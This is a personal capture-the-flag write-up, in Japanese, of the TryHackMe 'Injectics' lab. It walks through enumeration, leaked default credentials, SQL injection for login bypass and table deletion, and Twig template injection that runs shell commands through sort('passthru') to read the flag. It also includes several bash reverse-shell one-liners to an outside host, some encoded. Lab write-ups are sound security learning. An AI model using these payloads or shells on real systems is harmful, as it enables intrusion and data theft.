# Injectics CTF

https://tryhackme.com/r/room/injectics

## Enumeration

### ポートスキャン

```shell
root@ip-10-10-4-190:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-05 00:40 GMT
Nmap scan report for 10.10.140.0
Host is up (0.00018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:3D:01:EE:66:C3 (Unknown)
```

### gobuster

```shell
root@ip-10-10-4-190:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.140.0
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/flags                (Status: 301) [Size: 310] [--> http://10.10.140.0/flags/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.140.0/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.140.0/js/]
/javascript           (Status: 301) [Size: 315] [--> http://10.10.140.0/javascript/]
/vendor               (Status: 301) [Size: 311] [--> http://10.10.140.0/vendor/]
/phpmyadmin           (Status: 301) [Size: 315] [--> http://10.10.140.0/phpmyadmin/]
/server-status        (Status: 403) [Size: 276]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================

gobuster dir -x php,txt,html -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
```

ホームページコメント

```html
<!-- Website developed by John Tim - dev@injectics.thm-->
<!-- Mails are stored in mail.log file-->
```

mail.log

```text
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm
```

users テーブルが削除されたり破損したりすると、自動的にデフォルト認証情報で復活する。1 分間隔。  
users テーブルを削除する SQL を注入できれば、管理者ログインもできることになる。

デフォルト認証情報  
superadmin@injectics.thm | superSecurePasswd101  
dev@injectics.thm | devPasswd123

ちなみに初期状態ではデフォルト認証情報でログインできなかった。

## ログイン画面

普通のログイン画面と、管理者用のログイン画面が分かれている。

### ログインバイパス

ログインバイパスを注入できるか？

```text
username=dev@injectics.thm&password=' OR '1'='1&function=login

username=dev@injectics.thm&password='%0AoR%0A'1'='1&function=login

username=dev@injectics.thm&password='%09||%091=1--&function=login
```

うまくいかない。

### Users テーブル削除

users テーブルの削除を注入できるか？

```text
username=dev@injectics.thm&password='; delete from users; --&function=login

username=dev@injectics.thm&password='; DROP TABLE users; --&function=login

username=dev@injectics.thm&password=';%09dElEtE%09fRoM%09users;--&function=login

username=dev@injectics.thm&password=';%0AdE/**/lEtE%0AfRoM/**/users;--&function=login
```

うまくいかない。

全く分からなかったのでウォークスルーを見た。  
intruder を使って、username フィールドに SQLi リストを適用して弱点を探る。

```shell
wget https://github.com/payloadbox/sql-injection-payload-list/raw/refs/heads/master/Intruder/exploit/Auth_Bypass.txt
```

```text
このインジェクション（' OR 'x'='x'#;）で、
username='%20OR%20'x'%3d'x'%23%3b&password=aaa&function=login

ログインバイパスに成功している。
{"status":"success","message":"Login successful","is_admin":"true","first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
```

198 個中、成功したのはこの 1 個だけ。  
これを手作業で探すのは無理。

## dashboard.php

メダル数を編集できる画面

```http
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.140.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://10.10.140.0
Connection: keep-alive
Referer: http://10.10.140.0/edit_leaderboard.php?rank=1&country=USA
Cookie: PHPSESSID=kt6pe4ohp0fh53i4tor0tc29lr
Upgrade-Insecure-Requests: 1

rank=1&country=&gold=22&silver=21&bronze=1233
```

これで users テーブルを Drop。Delete では復元されなかった。

```text
rank=1&country=&gold=22;drop+table+users;&silver=21&bronze=12345
→
Seems like database or some important table is deleted. InjecticsService is running to restore it. Please wait for 1-2 minutes.
```

## 管理者ログイン

profile 画面へのリンクがあり、リンク先にはプロフィール変更のフォームがある。

Last Name にペイロードを入れてもそのままの形で保存される。First Name も同様。

```text
last';select * from users;--
```

mail フィールドを変更してもメールアドレスが変わらないため、mail は SQL で使われていない気がする。

変更した First Name がダッシュボードで表示されている。

```html
<div class="main-content">
  <div class="content">
    <h3>Welcome, admin2'; select * from users; --!</h3>
  </div>
</div>
```

たぶん PHP を注入できればリバースシェルを起動できるのではないだろうか？

```text
admin; exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/1234 0>&1'");
```

これはそのまま画面に表示されるだけで機能しなかった。

次に、下記を試した。

```php
"<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/1234 0>&1'") ?>"
をエンコード
&#x22;&#x3c;&#x3f;&#x70;&#x68;&#x70;&#x20;&#x65;&#x78;&#x65;&#x63;&#x28;&#x22;&#x2f;&#x62;&#x69;&#x6e;&#x2f;&#x62;&#x61;&#x73;&#x68;&#x20;&#x2d;&#x63;&#x20;&#x27;&#x62;&#x61;&#x73;&#x68;&#x20;&#x2d;&#x69;&#x20;&#x3e;&#x26;&#x20;&#x2f;&#x64;&#x65;&#x76;&#x2f;&#x74;&#x63;&#x70;&#x2f;&#x31;&#x30;&#x2e;&#x32;&#x2e;&#x32;&#x32;&#x2e;&#x31;&#x38;&#x32;&#x2f;&#x31;&#x32;&#x33;&#x34;&#x20;&#x30;&#x3e;&#x26;&#x31;&#x27;&#x22;&#x29;&#x20;&#x3f;&#x3e;&#x22;
```

デコードされて PHP のコードが表示されただけ。

### SSTI

```text
{{7*'7'}}
```

としたら
49 と表示された。

#### リバースシェル

```php
{{exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/1234 0>&1'")}}
```

下記のエラーが表示された。

```text
Unknown "exec" function in "__string_template__6f39863be97aec9b973ef9c5063a8cdf970415e721db486ff70810d1aa073d75" at line 1.
```

#### ls, cat

```text
burpでリクエストを変更。sort('system')ではだめだった。

email=superadmin%40injectics.thm&fname={{['ls',""]|sort('passthru')}}&lname=222

Welcome, adminLogin007.php banner.jpg composer.json composer.lock conn.php css dashboard.php edit_leaderboard.php flags functions.php index.php injecticsService.php js login.php logout.php mail.log script.js styles.css update_profile.php vendor Array!
```

```text
email=superadmin%40injectics.thm&fname={{['cd+flags;ls',""]|sort('passthru')}}&lname=222

Welcome, 5d8af1dc14503c7e4bdc8e51a3469f48.txt Array!
```

```text
email=superadmin%40injectics.thm&fname={{['cd+flags;cat+5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}&lname=222

Welcome, THM{} Array!
```

## 振り返り

- 全てのステップが難しかった。ウォークスルー見ないとどれだけ時間かけても終わらなかった気がする。
- SQLi の脆弱性を手作業で探るのは無理な場合もある。認証バイパスは比較的 intruder を使いやすい。
- SSTI は覚えられるようなものではないので、HackTricks 等を見ながら試行錯誤するしかない。
- 今回の場合、インジェクションを保存する画面と、テンプレートの評価結果が表示される画面が別だったため、SSTI 自動ツールは使えなかったのではないかと考えている。
